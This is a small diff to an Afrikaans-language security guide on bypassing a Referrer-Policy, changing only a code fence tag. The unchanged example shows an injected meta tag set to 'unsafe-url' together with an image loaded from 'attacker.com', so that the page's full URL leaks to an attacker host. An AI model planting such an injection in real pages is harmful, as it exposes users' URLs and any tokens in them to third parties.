@@ -24,7 +24,7 @@ Referrer-Policy: unsafe-url
 ## Teen-Mitigering
 
 Jy kan hierdie reël oorskry deur 'n HTML meta-tag te gebruik (die aanvaller moet 'n HTML-inspuiting benut):
-```markup
+```html
 <meta name="referrer" content="unsafe-url">
 <img src="https://attacker.com">
 ```
